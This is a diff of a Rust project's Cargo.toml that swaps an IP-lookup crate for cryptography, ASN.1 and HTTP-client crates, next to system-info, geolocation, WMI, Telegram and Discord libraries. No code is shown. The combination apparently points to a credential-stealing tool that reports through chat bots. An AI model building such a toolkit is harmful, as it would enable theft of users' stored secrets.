@@ -21,11 +21,18 @@ whoami = "1.2.1"
 sysinfo = "0.24.5"
 frankenstein = "0.19"
 tokio = { version = "1", features = ["macros", "fs", "rt-multi-thread", "rt"] }
-my_internet_ip = "0.1.1"
 ipgeolocate = "0.3.5"
 wmi = "0.9.3"
 regex = "1.6.0"
 serenity = { version = "0.11", features = ["rustls_backend", "model"]} 
+der-parser = "8.1.0"
+ring = "0.16"
+aes = "0.6.0"
+block-modes = "0.7.0"
+sha1 = "0.6.0"
+des = "0.6.0"
+hyper = { version = "0.14.2", features = ["client"], default-features = false }
+
 
 [profile.release] # optimize file size 
 lto = true
